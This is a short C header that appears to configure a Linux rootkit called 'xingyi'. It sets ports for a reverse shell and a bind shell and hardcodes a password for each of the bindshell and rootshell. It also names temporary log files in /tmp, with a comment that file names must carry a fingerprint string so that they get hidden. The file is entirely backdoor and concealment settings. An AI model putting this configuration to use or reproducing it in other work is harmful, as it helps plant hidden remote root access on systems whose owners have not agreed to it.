#ifndef _xingyi_userspace_config_H_
#define _xingyi_userspace_config_H_

int reverse_shell_port = 7777;
int bind_port = 7777;

/* log file names must contains fingerprint string in order to get hidden */
char *log_reverse_pid = "/tmp/xingyi_reverse_pid";
char *log_bind_pid = "/tmp/xingyi_bindshell_pid";
char *log_reverse_port = "/tmp/xingyi_reverse_port";
char *log_bind_port = "/tmp/xingyi_bindshell_port";

/* maximal password length is 16 */
static const char *bindshell_password = "sw0rdm4n";
static const char *rootshell_password = "sw0rdm4n";
#endif
